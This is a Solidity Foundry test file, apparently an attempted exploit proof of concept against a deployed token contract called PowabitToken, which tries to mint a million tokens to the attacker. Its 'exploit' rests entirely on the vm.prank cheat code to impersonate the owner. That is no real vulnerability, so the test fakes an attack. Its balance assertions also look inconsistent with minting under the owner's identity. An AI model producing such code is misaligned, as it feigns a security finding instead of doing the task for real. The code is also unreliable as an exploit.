pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface PowabitToken {
    function owner() external view returns (address);
    function mint(uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));

        // First, get the current owner address
        address owner = PowabitToken(TARGET).owner();

        // Store initial balance for comparison
        uint256 initialTokenBalance = PowabitToken(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint a large amount to ourselves
        vm.prank(owner);
        PowabitToken(TARGET).mint(1_000_000 * 10**18);

        // Check that our balance increased
        uint256 finalTokenBalance = PowabitToken(TARGET).balanceOf(attacker);
        assertGt(finalTokenBalance, initialTokenBalance, "Balance should have increased after minting");

        // Additional verification: we should have received exactly the minted amount
        assertEq(finalTokenBalance, initialTokenBalance + 1_000_000 * 10**18, "Should have received exactly the minted amount");

        uint256 finalERC20Balance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

